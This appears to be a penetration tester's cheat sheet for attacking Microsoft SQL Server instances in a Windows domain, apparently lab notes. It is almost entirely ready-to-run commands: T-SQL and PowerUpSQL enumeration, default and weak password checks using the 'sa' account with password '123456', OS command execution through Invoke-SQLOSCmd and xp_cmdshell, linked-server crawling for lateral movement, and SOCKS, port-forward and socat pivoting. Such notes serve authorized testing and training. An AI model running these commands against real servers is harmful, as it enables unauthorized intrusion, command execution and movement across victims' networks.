
Basic Enumerations
```
SELECT name FROM master..syslogins
SELECT is_srvrolemember('sysadmin');
SELECT is_srvrolemember('sysadmin','BUILTIN\Administrators') #Local Administrators in Sysadmin Role

SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
SELECT name FROM syslogins WHERE sysadmin = 1


SELECT name FROM syslogins WHERE sysadmin = 1
SELECT @@version;

```


### Enumeration 
```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p

powershell Get-sqlinstancebroadcast -verbose
powershell Get-sqlinstancebroadcast -verbose | Get-sqlserverlogindefaultpw -verbose
powershell Get-SQLInstanceDomain -Verbose
powershell Get-SQLServerInfo -Verbose -Instance sql-1.insomnia.io
powershell Get-SQLServerInfo -Verbose -Instance sql-1.insomnia.io | Get-SQLServerInfo
powershell Get-SQLInstanceLocal -Instance "sql-1.insomnia.io" -username 'sa' -password '123456' | Get-SQLServerInfo

```
###  OS Commands

```
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest
powershell Get-SQLQuery -Instance 'sql-1.insomnia.io,1433' -Query 'select @@version'
powershell Invoke-SQLAuditWeakLoginPw –Verbose
powershell Invoke-SQLOSCmd -Instance 'sql-1.insomnia.io,1433' -Command 'dir C:\' -RawResults
powershell Invoke-SQLOSCmd -Instance 'sql-1.insomnia.io,1433' -Command "dir c:\windows\system32\Drivers\etc" -RawResults
powershell Invoke-SQLOSCmd -Instance 'sql-1.insomnia.io,1433' -Command "ipconfig" -RawResults
powershell Invoke-SQLOSCmd -Instance 'sql-1.insomnia.io,1433' -Command "whoami"  –Threads 10

```

### Lateral Movement
```
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest
powershell Get-SQLServerLinkCrawl -Instance 'sql-1.insomnia.io,1433'
powershell Get-SQLServerLinkCrawl -Instance 'sql-1.insomnia.io,1433' -Query 'select @@version' | select Instance, CustomQuery
powershell Get-SQLServerLinkCrawl -verbose -instance "sql-1.insomnia.io,1433" -username 'sa' -password '123456'
powershell Get-SQLServerLinkCrawl -instance "insomnia.io" -Query "exec master..xp_cmdshell 'ipconfig'"
powershell Invoke-SQLOSCmd -Instance 'sql-1.insomnia.io,1433' -Command 'dir C:\Users\svc_mssql\Desktop' -RawResults 
powershell Invoke-SQLOSCmd -Instance 'sql-1.insomnia.io,1433' -Command 'dir C:\' -RawResults

```

```
socks 1080
rportfwd 8080 192.168.100.200 80
proxychains socat TCP4-Listen:1433,fork TCP:192.168.1.199:1433
runas /netonly /user:SQL\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
```

